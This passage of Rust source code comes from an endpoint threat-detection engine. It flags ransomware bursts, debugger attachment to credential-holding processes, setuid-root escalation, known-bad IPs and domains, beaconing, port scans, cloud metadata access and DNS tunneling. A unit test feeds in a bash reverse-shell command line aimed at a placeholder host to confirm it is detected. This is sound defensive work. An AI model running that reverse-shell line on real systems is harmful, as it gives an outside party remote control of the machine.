        for d in behavior::inspect_process_context(comm, exe, cmdline, ctx) {
            out.push(self.detection(Severity::Info, d));
        }
        // Windows LOLBin / persistence / evasion rules (match `*.exe` only).
        let windows_found = windows_rules::inspect_process(comm, exe, cmdline, ctx);
        let windows_extra =
            windows_evasion_rules::inspect_additional(comm, exe, cmdline, ctx, &windows_found);
        for d in windows_found.into_iter().chain(windows_extra) {
            out.push(self.detection(Severity::Info, d));
        }
    }

    /// The analytics clock of the event currently being inspected.
    fn clock(&self) -> f64 {
        f64::from_bits(self.clock_bits.load(Relaxed))
    }

    /// Remember a systemd unit written in this session, so a following
    /// `systemctl enable` escalates it.
    fn note_unit_write(&self, d: &DetectionData, ctx: Option<&ProcContext>) {
        if d.rule_id != "persistence.systemd_unit" {
            return;
        }
        let Some(session) = ctx.and_then(|c| c.root_key.clone().or_else(|| c.parent_key.clone()))
        else {
            return;
        };
        if let Ok(mut st) = self.stateful.lock() {
            st.observe_unit_write(&session, &d.subject, self.clock());
        }
    }

    /// A write (open for write, or rename onto) to a persistence location.
    fn inspect_file_write(
        &self,
        path: &str,
        comm: &str,
        ctx: Option<&ProcContext>,
        out: &mut Vec<AgentEvent>,
    ) {
        // Package installs and configuration management write these locations
        // by design.
        let managed = ctx.is_some_and(|c| {
            c.flags.iter().any(|f| {
                *f == severity::FLAG_PKG_MGR_LINEAGE || *f == severity::FLAG_CONFIG_MGMT_LINEAGE
            })
        });
        if managed {
            return;
        }
        if let Some(d) = files::inspect_write(path, comm) {
            self.note_unit_write(&d, ctx);
            out.push(self.detection(Severity::Info, d));
        }
    }

    /// ptrace attach/seize to a credential-holding process.
    /// Turn a filesystem ransomware indicator into a finding. The raw indicator
    /// stays telemetry (and drives auto-response); this is what the gate folds
    /// and the backend alerts on. Repeats of one burst share a subject, so
    /// 200 renamed files in one directory are one finding, not 200.
    fn inspect_ransomware(&self, r: &RansomwareIndicatorData, out: &mut Vec<AgentEvent>) {
        let place = r.path.as_deref().map(parent_dir).unwrap_or_default();
        let now = self.clock();
        let (rule_id, title, mut confidence, subject, corroborates) =
            match r.indicator_type.as_str() {
                "high_write_rate" => (
                    "ransomware.mass_modification",
                    "Mass file modification",
                    40,
                    "user-data".to_string(),
                    false,
                ),
                "suspicious_extension" => (
                    "ransomware.suspicious_extension",
                    "File with ransomware extension created",
                    70,
                    place,
                    true,
                ),
                "backup_deletion" => (
                    "ransomware.backup_tamper",
                    "Backup location deleted or moved",
                    60,
                    place,
                    true,
                ),
                "high_entropy" => (
                    "ransomware.high_entropy",
                    "Rewritten file has encrypted-looking content",
                    40,
                    place,
                    true,
                ),
                _ => return,
            };

        // Mass modification becomes an alert only next to corroboration, and a
        // corroborating indicator that follows a recent write burst re-raises it.
        let mut escalated_mass = None;
        if let Ok(mut ctx) = self.ransom.lock() {
            if rule_id == "ransomware.mass_modification" {
                ctx.last_mass_secs = Some(now);
                if RansomContext::within(ctx.last_corroboration_secs, now) {
                    confidence = 75;
                }
            } else if corroborates {
                ctx.last_corroboration_secs = Some(now);
                if RansomContext::within(ctx.last_mass_secs, now) {
                    escalated_mass = Some(());
                }
            }
        }

        let mut push = |rule_id: &str, title: &str, confidence: u8, subject: String| {
            out.push(self.detection(
                Severity::High,
                DetectionData {
                    rule_id: rule_id.into(),
                    title: title.into(),
                    category: "ransomware".into(),
                    confidence,
                    subject,
                    detail: r.details.clone(),
                    evidence: serde_json::json!({
                        "indicator_type": r.indicator_type,
                        "path": r.path,
                        "entropy": r.entropy,
                        "write_rate": r.write_rate,
                    }),
                    ..Default::default()
                },
            ));
        };
        push(rule_id, title, confidence, subject);
        if escalated_mass.is_some() {
            push(
                "ransomware.mass_modification",
                "Mass file modification",
                75,
                "user-data".to_string(),
            );
        }
    }

    fn inspect_ptrace(&self, p: &PtraceData, out: &mut Vec<AgentEvent>) {
        const PTRACE_ATTACH: u32 = 16;
        const PTRACE_SEIZE: u32 = 0x4206;
        const CRED_HOLDERS: &[&str] = &[
            "sshd",
            "sudo",
            "su",
            "passwd",
            "login",
            "gnome-keyring-d",
            "ssh-agent",
            "gpg-agent",
            "systemd-logind",
            "polkitd",
            "vault",
            "keepassxc",
        ];
        if p.request != PTRACE_ATTACH && p.request != PTRACE_SEIZE {
            return;
        }
        let target = self
            .ioa
            .lock()
            .ok()
            .and_then(|e| e.comm_of(p.target_pid))
            .unwrap_or_default();
        if !CRED_HOLDERS.contains(&target.as_str()) {
            return;
        }
        out.push(self.detection(
            Severity::Info,
            DetectionData {
                rule_id: "creds.proc_mem_access".into(),
                title: "Debugger attached to a credential-holding process".into(),
                category: "credential_access".into(),
                mitre_tactic: Some("TA0006 Credential Access".into()),
                mitre_technique: Some("T1003.007".into()),
                confidence: 85,
                subject: format!("{} (pid {})", target, p.target_pid),
                detail: format!(
                    "{} (pid {}) ptrace-attached to {} (pid {})",
                    p.comm, p.pid, target, p.target_pid
                ),
                evidence: serde_json::json!({
                    "pid": p.pid,
                    "target_pid": p.target_pid,
                    "target_comm": target,
                    "request": p.request,
                }),
                ..Default::default()
            },
        ));
    }

    fn inspect_setuid(&self, s: &SetuidData, out: &mut Vec<AgentEvent>) {
        // The setuid-root binaries whose whole purpose is to become root; a
        // finding per `sudo` would bury everything else.
        const SANCTIONED: &[&str] = &[
            "sudo",
            "su",
            "passwd",
            "pkexec",
            "newgrp",
            "chsh",
            "chfn",
            "gpasswd",
            "mount",
            "umount",
            "fusermount",
            "fusermount3",
            "unix_chkpwd",
            "ssh-keysign",
            "polkit-agent-he",
            "dbus-daemon-lau",
            "Xorg",
            "crontab",
            "at",
            "doas",
            "sshd",
            "login",
            "cron",
            "systemd",
            "snap-confine",
            "chrome-sandbox",
            "ping",
        ];
        if SANCTIONED.contains(&s.comm.as_str()) {
            return;
        }
        if s.new_uid == 0 && s.old_uid != 0 {
            out.push(self.detection(
                Severity::High,
                DetectionData {
                    rule_id: "privesc.setuid_root".into(),
                    title: "Privilege escalation via setuid(0)".into(),
                    category: "privilege_escalation".into(),
                    mitre_tactic: Some("TA0004 Privilege Escalation".into()),
                    mitre_technique: Some("T1548.001".into()),
                    confidence: 90,
                    subject: s.comm.clone(),
                    detail: format!(
                        "PID {} ({}) set effective UID to 0 (was UID {})",
                        s.pid, s.comm, s.old_uid
                    ),
                    evidence: serde_json::json!({
                        "pid":     s.pid,
                        "old_uid": s.old_uid,
                        "new_uid": s.new_uid,
                        "comm":    s.comm,
                    }),
                    ..Default::default()
                },
            ));
        }
    }

    fn inspect_network(
        &self,
        dst_addr: &str,
        dst_port: u16,
        elapsed_secs: f64,
        ctx: Option<&ProcContext>,
        out: &mut Vec<AgentEvent>,
    ) {
        self.inspect_ioc_ip(dst_addr, dst_port, out);
        self.inspect_network_behaviour(dst_addr, dst_port, elapsed_secs, ctx, out);
    }

    /// IOC: a connection to / from a known-bad IP.
    fn inspect_ioc_ip(&self, dst_addr: &str, dst_port: u16, out: &mut Vec<AgentEvent>) {
        let ip_hit = self
            .iocs
            .read()
            .map(|i| i.match_ip(dst_addr))
            .unwrap_or(false);
        if ip_hit {
            out.push(self.detection(
                Severity::Critical,
                DetectionData {
                    rule_id: "ioc.network_ip".into(),
                    title: "Connection to known-bad IP".into(),
                    category: "ioc".into(),
                    mitre_tactic: Some("TA0011 Command and Control".into()),
                    mitre_technique: Some("T1071".into()),
                    confidence: 95,
                    subject: format!("{dst_addr}:{dst_port}"),
                    detail: format!("Outbound connection to threat-intel IP {dst_addr}:{dst_port}"),
                    evidence: serde_json::json!({ "ip": dst_addr, "port": dst_port }),
                    ..Default::default()
                },
            ));
        }
    }

    /// Cadence / scan / IMDS analytics over outbound connections.
    fn inspect_network_behaviour(
        &self,
        dst_addr: &str,
        dst_port: u16,
        elapsed_secs: f64,
        ctx: Option<&ProcContext>,
        out: &mut Vec<AgentEvent>,
    ) {
        let now = elapsed_secs;

        // Beaconing cadence analysis. Only public destinations: a regular
        // cadence to a router, printer or Chromecast on the LAN is normal
        // device chatter, not command and control.
        if is_public_destination(dst_addr) {
            let key = format!("{dst_addr}:{dst_port}");
            let verdict = self
                .beacons
                .lock()
                .ok()
                .and_then(|mut b| b.observe(&key, now));
            if let Some(v) = verdict {
                // Regular cadence alone describes every keepalive, updater and
                // cloud client. It is only worth an alert when the process
                // making the calls runs from a user-writable location; below
                // confidence 50 the severity policy keeps it a low signal.
                let exe = ctx.map(|c| c.exe.as_str()).unwrap_or("");
                let from_writable = is_user_writable_path(exe);
                out.push(self.detection(
                    Severity::High,
                    DetectionData {
                        rule_id: "beaconing.regular_interval".into(),
                        title: "Periodic C2 beaconing detected".into(),
                        category: "beaconing".into(),
                        mitre_tactic: Some("TA0011 Command and Control".into()),
                        mitre_technique: Some("T1071".into()),
                        confidence: if from_writable { BEACON_CONFIDENCE_SUSPECT } else { BEACON_CONFIDENCE_ROUTINE },
                        subject: key.clone(),
                        detail: format!(
                            "Regular connections to {key}: ~{:.0}s interval over {} samples (CV {:.2})",
                            v.mean_interval_secs, v.samples, v.coefficient_of_variation
                        ),
                        evidence: serde_json::json!({
                            "mean_interval_secs": v.mean_interval_secs,
                            "cv": v.coefficient_of_variation,
                            "samples": v.samples,
                            "process_from_user_writable_path": from_writable,
                        }),
                        ..Default::default()
                    },
                ));
            }
        }

        // Reconnaissance / lateral-movement / IMDS heuristics run for every
        // destination (the tracker has its own filtering — and IMDS lives in
        // the 169.254.0.0/16 link-local range that `is_routable` excludes).
        let verdicts = self
            .netscan
            .lock()
            .map(|mut n| n.observe(dst_addr, dst_port, now))
            .unwrap_or_default();
        for v in verdicts {
            out.push(self.netscan_detection(dst_addr, dst_port, v));
        }
    }

    fn netscan_detection(
        &self,
        dst_addr: &str,
        dst_port: u16,
        verdict: netscan::NetVerdict,
    ) -> AgentEvent {
        use netscan::NetVerdict;
        let data = match verdict {
            NetVerdict::PortScan { target, ports } => DetectionData {
                rule_id: "recon.port_scan".into(),
                title: "Horizontal port scan of a single host".into(),
                category: "discovery".into(),
                mitre_tactic: Some("TA0007 Discovery".into()),
                mitre_technique: Some("T1046".into()),
                confidence: 70,
                subject: target.clone(),
                detail: format!("{ports} distinct ports contacted on {target} within the window"),
                evidence: serde_json::json!({ "target": target, "ports": ports }),
                ..Default::default()
            },
            NetVerdict::LateralMovement { port, service, hosts } => DetectionData {
                rule_id: "lateral.admin_port_sweep".into(),
                title: format!("Lateral movement: {service} sweep across internal hosts"),
                category: "lateral_movement".into(),
                mitre_tactic: Some("TA0008 Lateral Movement".into()),
                mitre_technique: Some("T1021".into()),
                confidence: 75,
                subject: format!("{service}:{port}"),
                detail: format!("{hosts} distinct internal hosts contacted on {service} ({port})"),
                evidence: serde_json::json!({ "port": port, "service": service, "hosts": hosts }),
                ..Default::default()
            },
            NetVerdict::ImdsAccess => DetectionData {
                rule_id: "cloud.imds_access".into(),
                title: "Access to cloud instance-metadata service".into(),
                category: "credential_access".into(),
                mitre_tactic: Some("TA0006 Credential Access".into()),
                mitre_technique: Some("T1552.005".into()),
                confidence: 55,
                subject: format!("{dst_addr}:{dst_port}"),
                detail: format!("Connection to cloud metadata endpoint {dst_addr} (IMDS credential theft vector)"),
                evidence: serde_json::json!({ "ip": dst_addr, "port": dst_port }),
                ..Default::default()
            },
        };
        let severity = severity_for(data.confidence);
        self.detection(severity, data)
    }

    #[cfg(target_os = "linux")]
    fn inspect_file_open(&self, path: &str, comm: &str, out: &mut Vec<AgentEvent>) {
        // Sensitive credential-store access (logic + lists live in the
        // filesystem collector, mirroring how `behavior` owns its heuristics).
        if let Some(d) = crate::collectors::linux::filesystem::inspect_sensitive_access(path, comm)
        {
            let sev = severity_for(d.confidence);
            out.push(self.detection(sev, d));
        }
    }

    /// Off-Linux there is no file-open telemetry source yet, and the sensitive
    /// path lists live in the Linux filesystem collector.
    #[cfg(not(target_os = "linux"))]
    fn inspect_file_open(&self, _path: &str, _comm: &str, _out: &mut Vec<AgentEvent>) {}

    fn inspect_domain(&self, domain: &str, elapsed_secs: f64, out: &mut Vec<AgentEvent>) {
        let matched = self.iocs.read().ok().and_then(|i| i.match_domain(domain));
        if let Some(matched) = matched {
            out.push(self.detection(
                Severity::Critical,
                DetectionData {
                    rule_id: "ioc.dns_domain".into(),
                    title: "DNS query for known-bad domain".into(),
                    category: "ioc".into(),
                    mitre_tactic: Some("TA0011 Command and Control".into()),
                    mitre_technique: Some("T1071.004".into()),
                    confidence: 90,
                    subject: domain.to_string(),
                    detail: format!("Resolved {domain}, matching threat-intel domain {matched}"),
                    evidence: serde_json::json!({ "domain": domain, "matched": matched }),
                    ..Default::default()
                },
            ));
        }

        // DNS-tunneling cadence / label-length analysis.
        let now = elapsed_secs;
        let verdict = self
            .dns_tunnel
            .lock()
            .ok()
            .and_then(|mut t| t.observe(domain, now));
        if let Some(v) = verdict {
            out.push(self.detection(
                Severity::High,
                DetectionData {
                    rule_id: "dns_tunnel.anomalous_query_volume".into(),
                    title: "Possible DNS tunneling".into(),
                    category: "exfiltration".into(),
                    mitre_tactic: Some("TA0011 Command and Control".into()),
                    mitre_technique: Some("T1071.004".into()),
                    confidence: 75,
                    subject: v.domain.clone(),
                    detail: format!(
                        "DNS tunneling indicators for {}: {} queries/min, avg label length {:.1} ({})",
                        v.domain, v.queries_per_min, v.avg_label_length, v.reason,
                    ),
                    evidence: serde_json::json!({
                        "domain": v.domain,
                        "queries_per_min": v.queries_per_min,
                        "avg_label_length": v.avg_label_length,
                        "reason": v.reason,
                    }),
                    ..Default::default()
                },
            ));
        }
    }

    // ── Helpers ──────────────────────────────────────────────────────────────

    fn detection(&self, severity: Severity, data: DetectionData) -> AgentEvent {
        AgentEvent::new(
            self.agent_id.clone(),
            self.hostname.clone(),
            EventClass::Detection,
            EventAction::Detected,
            severity,
            EventData::Detection(Box::new(data)),
        )
    }
}

/// Merge a process-lineage array into a detection's structured evidence so
/// every finding answers "how did the acting process come to exist". A `null`
/// evidence is promoted to an object; a non-object evidence is left untouched.
fn inject_lineage(evidence: &mut serde_json::Value, lineage: &serde_json::Value) {
    if evidence.is_null() {
        *evidence = serde_json::json!({});
    }
    if let Some(obj) = evidence.as_object_mut() {
        obj.insert("process_lineage".to_string(), lineage.clone());
    }
}

/// Set `slot` from `value` unless it already holds something.
fn fill<T>(slot: &mut Option<T>, value: Option<T>) {
    if slot.is_none() {
        *slot = value;
    }
}

/// Entities named by the event that triggered a finding.
fn entities_from_event(ev: &AgentEvent, c: &mut CorrelationKeys) {
    match &ev.data {
        EventData::ProcessExec(p) => {
            fill(&mut c.pid, Some(p.pid));
            fill(&mut c.exe, Some(p.exe.clone()).filter(|e| !e.is_empty()));
            fill(&mut c.exe_sha256, p.exe_sha256.clone());
            fill(
                &mut c.user,
                Some(p.username.clone()).filter(|u| !u.is_empty()),
            );
            fill(&mut c.container_id, p.container_id.clone());
        }
        EventData::ProcessCreate(p) => {
            fill(&mut c.pid, Some(p.pid));
            fill(&mut c.exe, Some(p.exe.clone()).filter(|e| !e.is_empty()));
            fill(&mut c.exe_sha256, p.exe_sha256.clone());
            fill(
                &mut c.user,
                Some(p.username.clone()).filter(|u| !u.is_empty()),
            );
        }
        EventData::NetworkConnection(n) => {
            fill(&mut c.pid, n.pid);
            fill(&mut c.remote_ip, Some(n.dst_addr.clone()));
            fill(&mut c.remote_port, Some(n.dst_port));
        }
        EventData::NetworkSocket(n) => {
            fill(&mut c.pid, Some(n.pid));
            fill(
                &mut c.user,
                Some(n.username.clone()).filter(|u| !u.is_empty()),
            );
            if n.op == "connect" || n.op == "accept" {
                fill(&mut c.remote_ip, Some(n.addr.clone()));
                fill(&mut c.remote_port, Some(n.port));
            }
        }
        EventData::DnsResolution(r) => {
            fill(&mut c.domain, Some(r.qname.clone()));
        }
        EventData::FileOpen(f) => {
            fill(&mut c.pid, Some(f.pid));
            fill(&mut c.file_path, Some(f.path.clone()));
            fill(
                &mut c.user,
                Some(f.username.clone()).filter(|u| !u.is_empty()),
            );
        }
        EventData::FileRename(r) => {
            fill(&mut c.pid, Some(r.pid));
            fill(&mut c.file_path, Some(r.new_path.clone()));
        }
        EventData::FileChmod(f) => {
            fill(&mut c.pid, Some(f.pid));
            fill(&mut c.file_path, Some(f.path.clone()));
        }
        EventData::Ptrace(p) => fill(&mut c.pid, Some(p.pid)),
        EventData::Setuid(s) => fill(&mut c.pid, Some(s.pid)),
        EventData::UserLogon(l) => {
            fill(&mut c.user, Some(l.username.clone()));
            fill(&mut c.remote_ip, l.src_addr.clone());
        }
        _ => {}
    }
}

/// Entities a finding's structured evidence names (`path`, `ip`, `domain`).
fn entities_from_evidence(evidence: &serde_json::Value, c: &mut CorrelationKeys) {
    let s = |k: &str| evidence.get(k).and_then(|v| v.as_str()).map(String::from);
    fill(&mut c.file_path, s("path").filter(|p| p.starts_with('/')));
    fill(&mut c.remote_ip, s("ip"));
    fill(&mut c.domain, s("domain"));
    fill(
        &mut c.pid,
        evidence
            .get("pid")
            .and_then(|v| v.as_i64())
            .map(|p| p as i32),
    );
}

/// Below this confidence a finding is context, and repeats from different
/// process instances of one binary are the same finding (see `KeyStrategy::Binary`).
const BINARY_KEY_MAX_CONFIDENCE: u8 = 50;

/// Context-level means the catalog only ever lets the rule act as correlation
/// context (signal mode), or this particular finding is too weak to alert.
fn is_context_level(meta: &catalog::RuleMeta, d: &DetectionData) -> bool {
    meta.mode == DetectionMode::Signal || d.confidence < BINARY_KEY_MAX_CONFIDENCE
}

/// The gate key repeats of a finding share, per the catalog's strategy.
fn dedup_key(meta: &catalog::RuleMeta, d: &DetectionData) -> String {
    use catalog::KeyStrategy;
    use sha2::{Digest, Sha256};
    let c = d.correlation.clone().unwrap_or_default();
    let or = |v: &Option<String>| v.clone().unwrap_or_default();
    let actor = c.exe.clone().unwrap_or_else(|| d.subject.clone());
    let material = match meta.dedup {
        KeyStrategy::Command => {
            let cmd = d
                .evidence
                .get("cmdline")
                .and_then(|v| v.as_str())
                .unwrap_or(&d.subject);
            format!("{}|{}|{}", or(&c.user), actor, normalize_cmdline(cmd))
        }
        KeyStrategy::Process => c.process_key.clone().unwrap_or_else(|| d.subject.clone()),
        KeyStrategy::Binary => match (&c.exe, is_context_level(meta, d)) {
            (Some(exe), true) => format!("{}|{}", or(&c.user), exe),
            _ => c.process_key.clone().unwrap_or_else(|| d.subject.clone()),
        },
        KeyStrategy::ProcessRemote => {
            let remote = c
                .domain
                .clone()
                .or_else(|| c.remote_ip.clone())
                .unwrap_or_else(|| d.subject.clone());
            format!("{}|{}", c.exe.clone().unwrap_or_default(), remote)
        }
        KeyStrategy::Path => format!(
            "{}|{}|{}",
            or(&c.user),
            actor,
            c.file_path.clone().unwrap_or_else(|| d.subject.clone())
        ),
        KeyStrategy::Subject => d.subject.clone(),
    };
    let digest = Sha256::digest(material.as_bytes());
    format!("{}:{}", d.rule_id, hex::encode(&digest[..8]))
}

/// Digits are run-varying noise (pids, ports, timestamps): fold them.
fn normalize_cmdline(cmd: &str) -> String {
    let mut out = String::with_capacity(cmd.len());
    let mut in_digits = false;
    for ch in cmd.split_whitespace().collect::<Vec<_>>().join(" ").chars() {
        if ch.is_ascii_digit() {
            if !in_digits {
                out.push('#');
            }
            in_digits = true;
        } else {
            in_digits = false;
            out.push(ch);
        }
    }
    out
}

/// Directory part of a Windows or Unix path (empty when there is none).
fn parent_dir(path: &str) -> String {
    path.rfind(['\\', '/'])
        .map(|i| path[..i].to_string())
        .unwrap_or_default()
}

/// True if `path` is in a world-writable / in-memory location.
fn is_temp_path(path: &str) -> bool {
    ["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"]
        .iter()
        .any(|p| path.starts_with(p))
}

/// Translate a matched Sigma rule into the agent's detection record. The
/// `subject` is the event's most identifying field (image/destination/file).
fn sigma_detection(rule: &sigma::CompiledRule, view: &sigma::fields::FieldView) -> DetectionData {
    let subject = view
        .get("image")
        .first()
        .or_else(|| view.get("destinationip").first())
        .or_else(|| view.get("targetfilename").first())
        .or_else(|| view.get("query").first())
        .cloned()
        .unwrap_or_else(|| view.category.to_string());
    // Map the Sigma severity ladder to a confidence so downstream auto-response
    // thresholds behave consistently with native detections.
    let confidence = match rule.level {
        Severity::Critical => 90,
        Severity::High => 80,
        Severity::Medium => 60,
        Severity::Low => 40,
        Severity::Info => 20,
    };
    DetectionData {
        rule_id: rule
            .id
            .clone()
            .map(|id| format!("sigma.{id}"))
            .unwrap_or_else(|| format!("sigma.{}", slugify(&rule.title))),
        title: rule.title.clone(),
        category: "sigma".into(),
        mitre_tactic: rule.mitre_tactic.clone(),
        mitre_technique: rule.mitre_technique.clone(),
        confidence,
        subject,
        detail: format!("Sigma rule '{}' matched", rule.title),
        evidence: serde_json::json!({
            "sigma_title": rule.title,
            "sigma_id": rule.id,
            "tags": rule.tags,
            "category": view.category,
        }),
        ..Default::default()
    }
}

/// Lower-case, dash-separated slug of a rule title for a stable rule_id.
fn slugify(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_ascii_lowercase()
            } else {
                '-'
            }
        })
        .collect::<String>()
        .split('-')
        .filter(|p| !p.is_empty())
        .collect::<Vec<_>>()
        .join("-")
}

fn severity_for(confidence: u8) -> Severity {
    match confidence {
        0..=39 => Severity::Low,
        40..=69 => Severity::Medium,
        70..=89 => Severity::High,
        _ => Severity::Critical,
    }
}

/// Confidence of a beacon verdict whose process runs from a user-writable path.
const BEACON_CONFIDENCE_SUSPECT: u8 = 70;
/// Confidence of any other beacon verdict. Below 50, so the severity policy
/// reports it as a low signal that never alerts on its own.
const BEACON_CONFIDENCE_ROUTINE: u8 = 35;

/// True if `addr` is a public internet destination: not loopback, unspecified,
/// private (RFC 1918), shared/CGNAT, link-local, multicast or unique-local. An
/// unparseable address is not public.
fn is_public_destination(addr: &str) -> bool {
    use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
    fn v4(a: Ipv4Addr) -> bool {
        let o = a.octets();
        !(a.is_unspecified()
            || a.is_loopback()
            || a.is_private()
            || a.is_link_local()
            || a.is_broadcast()
            || a.is_multicast()
            || (o[0] == 100 && (o[1] & 0xc0) == 64))
    }
    fn v6(a: Ipv6Addr) -> bool {
        if let Some(mapped) = a.to_ipv4_mapped() {
            return v4(mapped);
        }
        let seg = a.segments();
        !(a.is_unspecified()
            || a.is_loopback()
            || a.is_multicast()
            || (seg[0] & 0xfe00) == 0xfc00
            || (seg[0] & 0xffc0) == 0xfe80)
    }
    // A scoped address (`fe80::1%12`) carries a zone the parser rejects.
    let bare = addr.split('%').next().unwrap_or(addr);
    match bare.parse::<IpAddr>() {
        Ok(IpAddr::V4(a)) => v4(a),
        Ok(IpAddr::V6(a)) => v6(a),
        Err(_) => false,
    }
}

/// True if `path` is in a location an unprivileged user (or malware running as
/// one) can write to: temp directories, user profile app data, downloads and
/// the public profile, on Linux and Windows. Empty means unknown, not writable.
fn is_user_writable_path(path: &str) -> bool {
    let p = path.replace('\\', "/").to_ascii_lowercase();
    if p.is_empty() {
        return false;
    }
    ["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"]
        .iter()
        .any(|d| p.starts_with(d))
        || [
            "/appdata/local/temp/",
            "/appdata/roaming/",
            "/downloads/",
            "/users/public/",
            "/windows/temp/",
        ]
        .iter()
        .any(|d| p.contains(d))
}

/// True if `addr` is a routable destination worth cadence-tracking (skips
/// loopback, unspecified and obviously-local noise).
fn is_routable(addr: &str) -> bool {
    !(addr.is_empty()
        || addr == "0.0.0.0"
        || addr == "::"
        || addr == "127.0.0.1"
        || addr == "::1"
        || addr.starts_with("127.")
        || addr.starts_with("169.254."))
}

#[cfg(test)]
mod tests {
    #[test]
    fn binary_key_folds_context_findings_across_process_instances() {
        use crate::schema::CorrelationKeys;
        let meta = catalog::lookup("memory.anon_exec");
        let finding = |pid: i32, confidence: u8| DetectionData {
            rule_id: "memory.anon_exec".into(),
            subject: format!("pid {pid} (svchost.exe)"),
            confidence,
            correlation: Some(CorrelationKeys {
                exe: Some("C:\\Windows\\System32\\svchost.exe".into()),
                user: Some("SYSTEM".into()),
                process_key: Some(format!("w:{pid}:1")),
                ..Default::default()
            }),
            ..Default::default()
        };
        // Context level: two instances of one binary are one finding.
        assert_eq!(
            dedup_key(&meta, &finding(10, 40)),
            dedup_key(&meta, &finding(20, 40))
        );
        // Signal-mode rules fold at any confidence: rare_binary emits 55 and
        // tmp_exec 50, both outside the "weak finding" range.
        for rule in ["anomaly.rare_binary_for_user", "defense.tmp_exec"] {
            let meta = catalog::lookup(rule);
            let at = |pid: i32, confidence: u8| DetectionData {
                rule_id: rule.into(),
                ..finding(pid, confidence)
            };
            assert_eq!(
                dedup_key(&meta, &at(10, 55)),
                dedup_key(&meta, &at(20, 55)),
                "{rule}"
            );
        }
        // A thread running injected code stays per process instance.
        assert_ne!(
            dedup_key(&meta, &finding(10, 94)),
            dedup_key(&meta, &finding(20, 94))
        );
    }

    use super::*;
    use crate::schema::{ExecEventData, NetworkConnectionData, ProcessCreateData};

    fn engine() -> DetectionEngine {
        DetectionEngine {
            agent_id: "a".into(),
            hostname: "h".into(),
            iocs: RwLock::new(
                IocSet::from_json(
                    br#"{"ips":["203.0.113.5"],"domains":["evil.test"],"hashes":["deadbeef"]}"#,
                )
                .unwrap(),
            ),
            beacons: Mutex::new(beaconing::BeaconTracker::new()),
            netscan: Mutex::new(netscan::NetScanTracker::new()),
            dns_tunnel: Mutex::new(dns_tunnel::DnsTunnelTracker::new()),
            ioa: Mutex::new(ioa::IoaEngine::new()),
            sigma: RwLock::new(sigma::SigmaEngine::empty()),
            sigma_enabled: std::sync::atomic::AtomicBool::new(true),
            baseline: Mutex::new(baseline::BaselineEngine::new()),
            anomaly_enabled: std::sync::atomic::AtomicBool::new(true),
            stateful: Mutex::new(stateful::StatefulRules::new()),
            recorded_windows_logons: Mutex::new(RecordedWindowsLogons::default()),
            analysis_checkpoints: Mutex::new(CheckpointTracker::default()),
            ransom: Mutex::new(RansomContext::default()),
            gate: Mutex::new(gate::FindingGate::new()),
            // Not this test process: tests feed synthetic pids.
            self_pid: i32::MAX,
            ebpf_exec_seen: AtomicBool::new(false),
            ebpf_connect_seen: AtomicBool::new(false),
            file_events_seen: AtomicBool::new(false),
            started: Instant::now(),
            clock_bits: std::sync::atomic::AtomicU64::new(0),
            rule_modes: RwLock::new(std::collections::HashMap::new()),
        }
    }

    #[test]
    fn honeytoken_assessment_vectors_reach_external_admission() {
        let cases: serde_json::Value = serde_json::from_str(include_str!(
            "../../tests/fixtures/honeytoken-assessment-vectors.json"
        ))
        .unwrap();
        for case in cases.as_array().unwrap() {
            let data = serde_json::from_value(case["data"].clone()).unwrap();
            let event = AgentEvent::new(
                "a".into(),
                "h".into(),
                crate::schema::EventClass::Detection,
                crate::schema::EventAction::HoneytokenAccess,
                Severity::Critical,
                EventData::HoneytokenAccess(Box::new(data)),
            );
            let out = engine().admit_external(event);
            assert_eq!(out.len(), 1, "{}", case["name"]);
            let wire = serde_json::to_value(&out[0].event).unwrap();
            assert_eq!(wire["severity"], case["severity"], "{}", case["name"]);
            assert_eq!(wire["data"]["mode"], case["mode"], "{}", case["name"]);
        }
    }

    fn proc_event(name: &str, exe: &str, cmd: &str) -> AgentEvent {
        AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Process,
            EventAction::Create,
            Severity::Info,
            EventData::ProcessCreate(ProcessCreateData {
                pid: 1,
                ppid: 0,
                name: name.into(),
                exe: exe.into(),
                cmdline: cmd.into(),
                uid: 0,
                username: "root".into(),
                exe_sha256: None,
                ..Default::default()
            }),
        )
    }

    fn net_event(ip: &str, port: u16) -> AgentEvent {
        AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Network,
            EventAction::Connection,
            Severity::Info,
            EventData::NetworkConnection(NetworkConnectionData {
                protocol: "tcp".into(),
                src_addr: "10.0.0.2".into(),
                src_port: 5000,
                dst_addr: ip.into(),
                dst_port: port,
                state: "established".into(),
                pid: None,
                process_start_time: None,
                process: None,
                duration_ms: None,
                bytes_sent: None,
                bytes_recv: None,
                packets_sent: None,
                packets_recv: None,
                rtt_us: None,
            }),
        )
    }

    #[test]
    fn flags_reverse_shell_process() {
        let e = engine();
        let out = e.inspect(&proc_event(
            "bash",
            "/bin/bash",
            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        ));
        assert_eq!(out.len(), 1);
        assert!(matches!(out[0].class, EventClass::Detection));
    }

    #[test]
    fn flags_ioc_ip() {
        let e = engine();
        let out = e.inspect(&net_event("203.0.113.5", 443));
        assert!(out
            .iter()
            .any(|ev| matches!(&ev.data, EventData::Detection(d) if d.category == "ioc")));
    }

    #[test]
    fn flags_ioc_process_hash() {
        // A process whose collected exe_sha256 matches a threat-intel hash must
        // raise an ioc.process_hash detection (the hash now flows from the
        // collector through the event into the matcher).
        let e = engine();
        let ev = AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Process,
            EventAction::Exec,
            Severity::Info,
            EventData::ProcessExec(Box::new(ExecEventData {
                pid: 1,
                ppid: 0,
                uid: 0,
                gid: 0,
                username: "root".into(),
                comm: "x".into(),
                exe: "/tmp/x".into(),
                cmdline: "/tmp/x".into(),
                cwd: "/".into(),
                container_id: None,
                ld_preload: None,
                exe_sha256: Some("deadbeef".into()),
                loaded_libraries: Vec::new(),
                env: Default::default(),
                interpreter: None,
                container_runtime: None,
                container_image: None,
                container_image_digest: None,
                k8s: None,
                ..Default::default()
            })),
        );
        let out = e.inspect(&ev);
        assert!(
            out.iter().any(
                |d| matches!(&d.data, EventData::Detection(dd) if dd.rule_id == "ioc.process_hash")
            ),
            "a known-bad exe hash should fire ioc.process_hash"
        );
    }

    #[test]
    fn clean_traffic_is_quiet() {
        let e = engine();
